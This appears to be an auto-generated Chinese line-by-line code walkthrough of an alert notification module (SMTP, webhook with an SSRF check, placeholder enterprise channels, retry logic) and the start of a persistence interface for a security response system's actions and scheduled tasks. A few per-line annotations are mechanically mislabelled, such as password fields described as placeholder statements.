| 14 | 导入对象：从指定模块引入类、函数或常量。 | `from dataclasses import dataclass` |
| 15 | 导入对象：从指定模块引入类、函数或常量。 | `from email.mime.text import MIMEText` |
| 16 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Callable, Dict, List, Optional` |
| 17 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 18 | 导入对象：从指定模块引入类、函数或常量。 | `from src.response.webhook_url import WebhookUrlCheck, check_webhook_url_safe` |
| 19 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 20 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 21 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 22 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 23 | 装饰器：为下面的函数或类附加框架行为。 | `@dataclass` |
| 24 | 类定义：声明 `NotifyAttempt`，封装相关状态与行为。 | `class NotifyAttempt:` |
| 25 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    channel: str` |
| 26 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ok: bool` |
| 27 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    detail: str` |
| 28 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 29 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 30 | 类定义：声明 `NotificationChannel`，封装相关状态与行为。 | `class NotificationChannel(ABC):` |
| 31 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    name: str = "base"` |
| 32 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 33 | 装饰器：为下面的函数或类附加框架行为。 | `    @abstractmethod` |
| 34 | 函数定义：声明 `send` 的输入、处理逻辑和返回结果。 | `    def send(self, subject: str, body: str, *, meta: Optional[Dict[str, Any]] = None) -> NotifyAttempt:` |
| 35 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ...` |
| 36 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 37 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 38 | 类定义：声明 `SmtpNotificationChannel`，封装相关状态与行为。 | `class SmtpNotificationChannel(NotificationChannel):` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    name = "smtp"` |
| 40 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 41 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(` |
| 42 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 43 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 44 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        host: str,` |
| 45 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        port: int,` |
| 46 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        user: str,` |
| 47 | 占位语句：保持语法完整但当前不执行操作。 | `        password: str,` |
| 48 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        mail_from: str,` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        mail_to: str,` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        use_tls: bool = True,` |
| 51 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> None:` |
| 52 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._host = host` |
| 53 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._port = port` |
| 54 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._user = user` |
| 55 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._password = password` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._from = mail_from` |
| 57 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._to = mail_to.split(",") if mail_to else []` |
| 58 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._use_tls = use_tls` |
| 59 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 60 | 函数定义：声明 `send` 的输入、处理逻辑和返回结果。 | `    def send(self, subject: str, body: str, *, meta: Optional[Dict[str, Any]] = None) -> NotifyAttempt:` |
| 61 | 条件判断：满足条件时进入对应分支。 | `        if not self._host or not self._to:` |
| 62 | 返回结果：把处理后的值交回调用方。 | `            return NotifyAttempt(self.name, False, "smtp_not_configured")` |
| 63 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        msg = MIMEText(body, "plain", "utf-8")` |
| 64 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        msg["Subject"] = subject` |
| 65 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        msg["From"] = self._from` |
| 66 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        msg["To"] = ", ".join(self._to)` |
| 67 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 68 | 上下文管理：自动管理资源打开与释放。 | `            with smtplib.SMTP(self._host, self._port, timeout=15) as server:` |
| 69 | 条件判断：满足条件时进入对应分支。 | `                if self._use_tls:` |
| 70 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    server.starttls()` |
| 71 | 条件判断：满足条件时进入对应分支。 | `                if self._user:` |
| 72 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    server.login(self._user, self._password)` |
| 73 | 函数调用：执行已有函数/方法完成当前步骤。 | `                server.sendmail(self._from, self._to, msg.as_string())` |
| 74 | 返回结果：把处理后的值交回调用方。 | `            return NotifyAttempt(self.name, True, "sent")` |
| 75 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 76 | 注释：解释下面或当前这段代码的设计意图。 | `            # 不向日志/返回值泄露认证细节（密码等可能出现在异常文本中）` |
| 77 | 返回结果：把处理后的值交回调用方。 | `            return NotifyAttempt(self.name, False, f"smtp_error:{type(exc).__name__}")` |
| 78 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 79 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 80 | 类定义：声明 `WebhookNotificationChannel`，封装相关状态与行为。 | `class WebhookNotificationChannel(NotificationChannel):` |
| 81 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    name = "webhook"` |
| 82 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 83 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(self, url: str, timeout_sec: float = 10.0) -> None:` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._url = url.strip()` |
| 85 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._timeout_sec = timeout_sec` |
| 86 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 87 | 函数定义：声明 `send` 的输入、处理逻辑和返回结果。 | `    def send(self, subject: str, body: str, *, meta: Optional[Dict[str, Any]] = None) -> NotifyAttempt:` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        chk = check_webhook_url_safe(self._url)` |
| 89 | 条件判断：满足条件时进入对应分支。 | `        if not chk.ok:` |
| 90 | 返回结果：把处理后的值交回调用方。 | `            return NotifyAttempt(self.name, False, f"ssrf_blocked:{chk.reason}")` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        payload = {` |
| 92 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "subject": subject,` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "body": body,` |
| 94 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "meta": meta or {},` |
| 95 | 代码语句：参与当前文件的业务流程或数据处理。 | `        }` |
| 96 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        data = json.dumps(payload, ensure_ascii=False).encode("utf-8")` |
| 97 | 请求读取：从 HTTP 请求中提取参数、JSON 或上下文信息。 | `        req = urllib.request.Request(` |
| 98 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self._url,` |
| 99 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            data=data,` |
| 100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            headers={"Content-Type": "application/json; charset=utf-8"},` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            method="POST",` |
| 102 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 103 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 104 | 上下文管理：自动管理资源打开与释放。 | `            with urllib.request.urlopen(req, timeout=self._timeout_sec) as resp:` |
| 105 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                code = getattr(resp, "status", None) or resp.getcode()` |
| 106 | 条件判断：满足条件时进入对应分支。 | `                if code and int(code) >= 400:` |
| 107 | 返回结果：把处理后的值交回调用方。 | `                    return NotifyAttempt(self.name, False, f"http_{code}")` |
| 108 | 返回结果：把处理后的值交回调用方。 | `            return NotifyAttempt(self.name, True, "ok")` |
| 109 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except urllib.error.HTTPError as exc:` |
| 110 | 返回结果：把处理后的值交回调用方。 | `            return NotifyAttempt(self.name, False, f"http_error:{exc.code}")` |
| 111 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except urllib.error.URLError as exc:` |
| 112 | 返回结果：把处理后的值交回调用方。 | `            return NotifyAttempt(self.name, False, f"url_error:{type(exc).__name__}")` |
| 113 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 114 | 返回结果：把处理后的值交回调用方。 | `            return NotifyAttempt(self.name, False, f"webhook_error:{type(exc).__name__}")` |
| 115 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 116 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 117 | 类定义：声明 `EnterprisePlaceholderChannel`，封装相关状态与行为。 | `class EnterprisePlaceholderChannel(NotificationChannel):` |
| 118 | 文档字符串：说明当前模块、类或函数的职责。 | `    """企业微信/钉钉/飞书等统一占位，不落真实签名请求。"""` |
| 119 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 120 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    name = "enterprise_placeholder"` |
| 121 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 122 | 函数定义：声明 `send` 的输入、处理逻辑和返回结果。 | `    def send(self, subject: str, body: str, *, meta: Optional[Dict[str, Any]] = None) -> NotifyAttempt:` |
| 123 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.warning(` |
| 124 | 函数调用：执行已有函数/方法完成当前步骤。 | `            "[企业通知占位] subject=%s len(body)=%d meta_keys=%s",` |
| 125 | 代码语句：参与当前文件的业务流程或数据处理。 | `            subject[:120],` |
| 126 | 函数调用：执行已有函数/方法完成当前步骤。 | `            len(body),` |
| 127 | 函数调用：执行已有函数/方法完成当前步骤。 | `            list((meta or {}).keys()),` |
| 128 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 129 | 返回结果：把处理后的值交回调用方。 | `        return NotifyAttempt(self.name, True, "placeholder_no_external_io")` |
| 130 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 131 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 132 | 类定义：声明 `AlertNotifier`，封装相关状态与行为。 | `class AlertNotifier:` |
| 133 | 文档字符串：说明当前模块、类或函数的职责。 | `    """聚合多通道；支持失败重试（同步）。"""` |
| 134 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 135 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(` |
| 136 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 137 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        channels: List[NotificationChannel],` |
| 138 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 139 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        max_retries: int = 3,` |
| 140 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        retry_backoff_sec: float = 0.2,` |
| 141 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        sleep_fn: Callable[[float], None] = time.sleep,` |
| 142 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> None:` |
| 143 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._channels = list(channels)` |
| 144 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._max_retries = max(1, max_retries)` |
| 145 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._retry_backoff_sec = retry_backoff_sec` |
| 146 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._sleep_fn = sleep_fn` |
| 147 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 148 | 装饰器：为下面的函数或类附加框架行为。 | `    @classmethod` |
| 149 | 函数定义：声明 `from_env` 的输入、处理逻辑和返回结果。 | `    def from_env(cls) -> "AlertNotifier":` |
| 150 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        channels: List[NotificationChannel] = []` |
| 151 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 152 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        smtp_host = os.environ.get("ALERT_SMTP_HOST", "").strip()` |
| 153 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        smtp_port = int(os.environ.get("ALERT_SMTP_PORT", "587"))` |
| 154 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        smtp_user = os.environ.get("ALERT_SMTP_USER", "").strip()` |
| 155 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        smtp_pass = os.environ.get("ALERT_SMTP_PASSWORD", "").strip()` |
| 156 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        mail_from = os.environ.get("ALERT_SMTP_FROM", "").strip()` |
| 157 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        mail_to = os.environ.get("ALERT_EMAIL", "").strip()` |
| 158 | 条件判断：满足条件时进入对应分支。 | `        if smtp_host and mail_from and mail_to:` |
| 159 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            use_tls = os.environ.get("ALERT_SMTP_USE_TLS", "true").lower() == "true"` |
| 160 | 函数调用：执行已有函数/方法完成当前步骤。 | `            channels.append(` |
| 161 | 函数调用：执行已有函数/方法完成当前步骤。 | `                SmtpNotificationChannel(` |
| 162 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    host=smtp_host,` |
| 163 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    port=smtp_port,` |
| 164 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    user=smtp_user,` |
| 165 | 占位语句：保持语法完整但当前不执行操作。 | `                    password=smtp_pass,` |
| 166 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    mail_from=mail_from,` |
| 167 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    mail_to=mail_to,` |
| 168 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    use_tls=use_tls,` |
| 169 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 170 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 171 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 172 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        wh = os.environ.get("ALERT_WEBHOOK", "").strip()` |
| 173 | 条件判断：满足条件时进入对应分支。 | `        if wh:` |
| 174 | 函数调用：执行已有函数/方法完成当前步骤。 | `            channels.append(WebhookNotificationChannel(wh))` |
| 175 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 176 | 条件判断：满足条件时进入对应分支。 | `        if os.environ.get("ALERT_ENTERPRISE_CHANNEL_ENABLED", "").lower() == "true":` |
| 177 | 函数调用：执行已有函数/方法完成当前步骤。 | `            channels.append(EnterprisePlaceholderChannel())` |
| 178 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 179 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        max_retries = int(os.environ.get("ALERT_NOTIFY_MAX_RETRIES", "3"))` |
| 180 | 返回结果：把处理后的值交回调用方。 | `        return cls(channels, max_retries=max_retries)` |
| 181 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 182 | 函数定义：声明 `notify_all` 的输入、处理逻辑和返回结果。 | `    def notify_all(` |
| 183 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 184 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        subject: str,` |
| 185 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        body: str,` |
| 186 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 187 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        meta: Optional[Dict[str, Any]] = None,` |
| 188 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> List[NotifyAttempt]:` |
| 189 | 文档字符串：说明当前模块、类或函数的职责。 | `        """逐通道发送；单通道失败会重试。返回每次尝试的汇总（最后一次为主）。"""` |
| 190 | 条件判断：满足条件时进入对应分支。 | `        if not self._channels:` |
| 191 | 返回结果：把处理后的值交回调用方。 | `            return [NotifyAttempt("none", True, "no_channels_configured")]` |
| 192 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        results: List[NotifyAttempt] = []` |
| 193 | 循环：逐个处理集合或迭代器中的元素。 | `        for ch in self._channels:` |
| 194 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            last: Optional[NotifyAttempt] = None` |
| 195 | 循环：逐个处理集合或迭代器中的元素。 | `            for attempt in range(self._max_retries):` |
| 196 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                last = ch.send(subject, body, meta=meta)` |
| 197 | 函数调用：执行已有函数/方法完成当前步骤。 | `                results.append(last)` |
| 198 | 条件判断：满足条件时进入对应分支。 | `                if last.ok:` |
| 199 | 跳出循环：提前结束当前循环。 | `                    break` |
| 200 | 条件判断：满足条件时进入对应分支。 | `                if attempt + 1 < self._max_retries:` |
| 201 | 函数调用：执行已有函数/方法完成当前步骤。 | `                    self._sleep_fn(self._retry_backoff_sec * (2**attempt))` |
| 202 | 注释：解释下面或当前这段代码的设计意图。 | `            # last 非 None` |
| 203 | 返回结果：把处理后的值交回调用方。 | `        return results` |

## `src/response/persistence.py`

- 类型：自动响应
- 行数：308

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `响应动作与调度任务的数据库持久化（Flask-SQLAlchemy，独立于 Web 请求上下文）。` |
| 3 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 4 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 5 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 6 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 7 | 导入对象：从指定模块引入类、函数或常量。 | `from contextlib import contextmanager` |
| 8 | 导入对象：从指定模块引入类、函数或常量。 | `from dataclasses import dataclass` |
| 9 | 导入对象：从指定模块引入类、函数或常量。 | `from datetime import datetime` |
| 10 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Dict, Iterator, List, Optional` |
| 11 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 12 | 导入对象：从指定模块引入类、函数或常量。 | `from flask import Flask` |
| 13 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 14 | 导入对象：从指定模块引入类、函数或常量。 | `from web.database import db` |
| 15 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 16 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 17 | 装饰器：为下面的函数或类附加框架行为。 | `@dataclass` |
| 18 | 类定义：声明 `ScheduleTaskRow`，封装相关状态与行为。 | `class ScheduleTaskRow:` |
| 19 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    id: int` |
| 20 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    task_type: str` |
| 21 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    alert_id: Optional[str]` |
| 22 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    payload: Dict[str, Any]` |
| 23 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    run_at: datetime` |
| 24 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    status: str` |
| 25 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    attempt_count: int` |
| 26 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    max_attempts: int` |
| 27 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    related_response_action_id: Optional[int]` |
| 28 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    last_error: Optional[str] = None` |
| 29 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 30 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 31 | 类定义：声明 `ResponsePersistence`，封装相关状态与行为。 | `class ResponsePersistence:` |
| 32 | 文档字符串：说明当前模块、类或函数的职责。 | `    """最小持久化接口。"""` |
| 33 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 34 | 函数定义：声明 `save_response_action` 的输入、处理逻辑和返回结果。 | `    def save_response_action(` |
| 35 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 36 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alert_id: Optional[str],` |
| 38 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        action_type: str,` |
| 39 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        target: Optional[str],` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        status: str,` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dry_run: bool,` |
| 42 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        error: Optional[str] = None,` |
| 43 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        scheduled_unblock_at: Optional[datetime] = None,` |
| 44 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        meta: Optional[Dict[str, Any]] = None,` |
| 45 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> int:` |
| 46 | 抛出异常：主动报告不可继续的错误。 | `        raise NotImplementedError` |
| 47 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 48 | 函数定义：声明 `enqueue_schedule_task` 的输入、处理逻辑和返回结果。 | `    def enqueue_schedule_task(` |
| 49 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 50 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 51 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        task_type: str,` |
| 52 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        run_at: datetime,` |
| 53 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alert_id: Optional[str],` |
| 54 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        payload: Dict[str, Any],` |
| 55 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        related_response_action_id: Optional[int] = None,` |
| 56 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        max_attempts: int = 5,` |
| 57 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> int:` |
| 58 | 抛出异常：主动报告不可继续的错误。 | `        raise NotImplementedError` |
| 59 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 60 | 函数定义：声明 `fetch_due_tasks` 的输入、处理逻辑和返回结果。 | `    def fetch_due_tasks(self, *, before: datetime, limit: int = 50) -> List[ScheduleTaskRow]:` |
| 61 | 抛出异常：主动报告不可继续的错误。 | `        raise NotImplementedError` |
| 62 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 63 | 函数定义：声明 `update_schedule_task` 的输入、处理逻辑和返回结果。 | `    def update_schedule_task(` |
| 64 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 65 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        task_id: int,` |
| 66 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 67 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        status: str,` |
| 68 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        attempt_count: Optional[int] = None,` |
| 69 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        last_error: Optional[str] = None,` |
| 70 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        run_at: Optional[datetime] = None,` |
| 71 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> None:` |
| 72 | 抛出异常：主动报告不可继续的错误。 | `        raise NotImplementedError` |
| 73 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 74 | 函数定义：声明 `append_audit_db_event` 的输入、处理逻辑和返回结果。 | `    def append_audit_db_event(` |
| 75 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 76 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 77 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        event_type: str,` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        payload: Optional[Dict[str, Any]] = None,` |
| 79 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        resource_id: Optional[str] = None,` |
| 80 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> None:` |
| 81 | 文档字符串：说明当前模块、类或函数的职责。 | `        """可选写入 audit_events 表。"""` |
| 82 | 抛出异常：主动报告不可继续的错误。 | `        raise NotImplementedError` |
| 83 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 84 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 85 | 类定义：声明 `NullResponsePersistence`，封装相关状态与行为。 | `class NullResponsePersistence(ResponsePersistence):` |
| 86 | 函数定义：声明 `save_response_action` 的输入、处理逻辑和返回结果。 | `    def save_response_action(` |
| 87 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 88 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 89 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alert_id: Optional[str],` |
| 90 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        action_type: str,` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        target: Optional[str],` |
| 92 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        status: str,` |
| 93 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        dry_run: bool,` |
| 94 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        error: Optional[str] = None,` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        scheduled_unblock_at: Optional[datetime] = None,` |
| 96 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        meta: Optional[Dict[str, Any]] = None,` |
| 97 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> int:` |
| 98 | 返回结果：把处理后的值交回调用方。 | `        return 0` |
| 99 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 100 | 函数定义：声明 `enqueue_schedule_task` 的输入、处理逻辑和返回结果。 | `    def enqueue_schedule_task(` |
| 101 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 102 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        task_type: str,` |
| 104 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        run_at: datetime,` |
| 105 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        alert_id: Optional[str],` |
| 106 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        payload: Dict[str, Any],` |
| 107 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        related_response_action_id: Optional[int] = None,` |
| 108 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        max_attempts: int = 5,` |
| 109 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> int:` |
| 110 | 返回结果：把处理后的值交回调用方。 | `        return 0` |
| 111 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
